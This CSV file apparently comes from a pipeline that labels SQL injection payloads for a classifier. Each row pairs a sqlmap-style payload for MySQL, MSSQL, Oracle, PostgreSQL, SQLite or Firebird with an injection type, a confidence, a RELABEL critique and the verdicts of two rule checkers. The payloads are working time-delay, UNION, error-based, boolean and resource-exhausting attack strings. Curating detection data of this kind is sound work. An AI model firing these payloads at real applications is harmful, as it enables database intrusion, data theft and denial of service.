payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
"1 ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,"1 ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",False,0,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload)
1' ) ) as dago where 9788 = 9788,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) ) as dago where 9788 = 9788,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"1%"" ) and 9198 = 9198--",boolean_blind,generic,0.5,and_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,"1%"" ) and 9198 = 9198--",False,0,boolean_blind,generic,Pattern match: 'and 9198 = 9198' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%' = '",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%' = '",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
"select count ( * ) from generate_series ( 1,5000000 ) and ( 'tnvm' like 'tnvm",heavy_query,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars),heavy_query,postgresql,"select count ( * ) from generate_series ( 1,5000000 ) and ( 'tnvm' like 'tnvm",False,0,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload)
"1%' and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%' and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1"" ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( ""ymhg"" = ""ymhg",boolean_blind,mysql,0.7,row_count,RELABEL,reasoning too short (9 chars),boolean_blind,mysql,"1"" ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( ""ymhg"" = ""ymhg",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-9557%"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""%"" = """,out_of_band,oracle,0.9,dbms_utility,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,oracle,"-9557%"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""%"" = """,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"1"" ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""cmhh"" like ""cmhh",out_of_band,oracle,0.9,ctxsys_drithsx,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,"1"" ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""cmhh"" like ""cmhh",False,0,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected
select sleep ( 5 ) and ( 1435 = 1435,time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,select sleep ( 5 ) and ( 1435 = 1435,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""tkkg"" = ""tkkg",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,"1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""tkkg"" = ""tkkg",False,0,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload)
"-4866"" ) as eyrq where 8365 = 8365 or 1898 = 8320#",boolean_blind,generic,0.5,or_inequality,RELABEL,reasoning too short (13 chars); confidence too low (0.50),boolean_blind,generic,"-4866"" ) as eyrq where 8365 = 8365 or 1898 = 8320#",False,0,boolean_blind,generic,Pattern match: 'or 1898 = 8320' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1%"" ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,waitfor,RELABEL,reasoning too short (7 chars),time_blind,mssql,"1%"" ) waitfor delay '0:0:5'--",False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1' ) as keom where 7524 = 7524 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) as keom where 7524 = 7524 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-6971"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""ifuh"" like ""ifuh",out_of_band,oracle,0.9,dbms_utility,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,oracle,"-6971"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""ifuh"" like ""ifuh",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
-8264%' ) order by 1#,boolean_blind,generic,0.5,order_by,RELABEL,reasoning too short (8 chars); confidence too low (0.50),boolean_blind,generic,-8264%' ) order by 1#,False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
if ( 6647 = 2179 ) select 6647 else drop function zvlq--,stacked_queries,generic,0.7,if_drop,RELABEL,reasoning too short (7 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,if ( 6647 = 2179 ) select 6647 else drop function zvlq--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
1'+ ( select 'ezpy' where 5282 = 5282 order by 1#,boolean_blind,generic,0.5,order_by,RELABEL,reasoning too short (8 chars); confidence too low (0.50),boolean_blind,generic,1'+ ( select 'ezpy' where 5282 = 5282 order by 1#,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-6770"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",boolean_blind,postgresql,0.7,postgresql_cast,RELABEL,reasoning too short (15 chars),boolean_blind,postgresql,"-6770"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( '%' = '",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( '%' = '",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1%' ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars),heavy_query,postgresql,"1%' ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",False,0,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload)
select 'qqpjq'|| ( case 5118 when 5118 then 1 else 0 end ) ||'qzvzq' from rdb$database,boolean_blind,firebird,0.7,rdb_conditional,RELABEL,reasoning too short (15 chars),boolean_blind,firebird,select 'qqpjq'|| ( case 5118 when 5118 then 1 else 0 end ) ||'qzvzq' from rdb$database,False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'holo' = 'holo",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'holo' = 'holo",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'mexd' like 'mexd",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'mexd' like 'mexd",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
select ( case when ( 4780 = 4432 ) then 4780 else 4780* ( select 4780 from mysql.db ) end ) #,boolean_blind,mysql,0.7,mysql_db,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,select ( case when ( 4780 = 4432 ) then 4780 else 4780* ( select 4780 from mysql.db ) end ) #,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1"" where 7599 = 7599",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"1"" where 7599 = 7599",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"1 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) # bzoq",heavy_query,generic,0.7,domain_join,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) # bzoq",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
1%' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( '%' = ',boolean_blind,generic,0.5,arithmetic,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,1%' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( '%' = ',False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
1'|| ( select 'yzdz' where 5021 = 5021,union_based,generic,0.7,union_concat,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,1'|| ( select 'yzdz' where 5021 = 5021,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
-4617' ) ) ) or 9323 = 9323#,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-4617' ) ) ) or 9323 = 9323#,False,0,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1' ) as khaa where 8157 = 8157 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,"1' ) as khaa where 8157 = 8157 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1 ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 6556 = 6556",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,"1 ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 6556 = 6556",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""uvoq"" like ""uvoq",time_blind,generic,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,generic,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""uvoq"" like ""uvoq",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1,iif ( 7475 = 7475,1,1/0 )",boolean_blind,mssql,0.7,iif_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mssql,"1,iif ( 7475 = 7475,1,1/0 )",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
"-7564' ) as nank where 8095 = 8095 union all select 8095,8095,8095--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-7564' ) as nank where 8095 = 8095 union all select 8095,8095,8095--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1 ) as pyjx where 9005 = 9005,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1 ) as pyjx where 9005 = 9005,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"1"" ) as doai where 7024 = 7024 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) as doai where 7024 = 7024 union all select null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""uvvy"" like ""uvvy",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""uvvy"" like ""uvvy",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-2254' ) as dyrv where 9079 = 9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-2254' ) as dyrv where 9079 = 9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%' ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( '%' = '",boolean_blind,mysql,0.7,count_concat,RELABEL,reasoning too short (12 chars),boolean_blind,mysql,"1%' ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( '%' = '",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1%"" ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1%"" ) union all select null,null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" and 9468 = 7105--",boolean_blind,generic,0.5,inequality,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,"1"" and 9468 = 7105--",False,0,boolean_blind,generic,Pattern match: 'and 9468 = 7105' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1' ) where 1225 = 1225 and elt ( 8831 = 7779,7779 ) --",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,"1' ) where 1225 = 1225 and elt ( 8831 = 7779,7779 ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 'jutx' = 'jutx",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 'jutx' = 'jutx",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1' in boolean mode ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1' in boolean mode ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"1"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"1%"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""%"" = """,heavy_query,generic,0.7,domain_join,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1'|| ( select 'pygt' from dual where 5543 = 5543 union all select null,null,null,null,null,null#",union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars),union_based,oracle,"1'|| ( select 'pygt' from dual where 5543 = 5543 union all select null,null,null,null,null,null#",False,0,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
"1 ) union all select null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1 ) union all select null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1'+ ( select 'pgje' where 4658 = 4658 union all select null,null,null,null,null,null,null,null,null,null#",union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars),union_based,oracle,"1'+ ( select 'pgje' where 4658 = 4658 union all select null,null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
select ( case when ( 1812 = 2446 ) then 1812 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.7,case_cast,RELABEL,reasoning too short (9 chars),boolean_blind,oracle,select ( case when ( 1812 = 2446 ) then 1812 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = """,time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
select ( case when ( 8375 = 8318 ) then 8375 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.7,case_cast,RELABEL,reasoning too short (9 chars),boolean_blind,oracle,select ( case when ( 8375 = 8318 ) then 8375 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"1' in boolean mode ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) #",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' in boolean mode ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
